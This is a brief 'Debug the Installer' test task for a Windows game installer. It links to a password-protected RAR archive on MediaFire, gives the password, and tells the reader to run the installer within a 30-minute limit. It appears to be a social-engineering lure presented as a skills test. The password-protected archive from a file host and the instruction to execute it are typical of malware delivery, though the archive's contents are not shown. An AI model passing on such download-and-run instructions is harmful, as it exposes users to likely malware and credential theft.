# Debug the Installer Test Task
Objective: Find and fix the intentional bug in a Windows game installer.





📥 Download & Install
Download the broken installer:

Password: Test

[broken_installer](https://download1078.mediafire.com/lb887mss8mhgceR04SJ54sNQHpe0M5wsm8Mv7S_F9zUeGl6ujX7UlDoVK9zch4OIctBgPsND2GebYYIWlvoIq1ab6eFoNpn-UMjI6mBKDkyR80_LnMVCsAp80tHJPpl9FAkEgdPAyRYoX9ePhfHLi4kKjGkt5r2fbsZ2HD3LHA/9y48tfamo2sm4oi/broken_installer.rar)

Run it. The installation will fail or the app won’t launch.




🐛 Your Task
Identify the bug:

Why does the installer fail?

Where is the broken component (missing file, registry error, permission issue, etc.)?

Fix it:

Provide a corrected script/patch (e.g., NSIS/Inno Setup/.bat).




🔍 Debugging Tips
Use these tools to find the issue:

Logs: Check _install.log, setup.log, or Windows Event Viewer.

Process Monitor (ProcMon): Trace file/registry access.

Verbose mode: Run the installer with flags like /verbose (NSIS/Inno).




📤 Submission
Submit a ZIP file with:

Description: What was broken and how you fixed it.

Fixed script: The corrected installer code (e.g., .nsi, .iss, or .bat).

(Optional) Screenshots/Logs: Proof of your debugging process.

⏱ Time limit: 30 minutes.




🎯 Evaluation Criteria

✅ Correctly identified the root cause.

✅ Provided a working fix.

✅ Clean, efficient solution (no unnecessary changes).

🚀 Bonus points: Suggested improvements (e.g., added file validation).
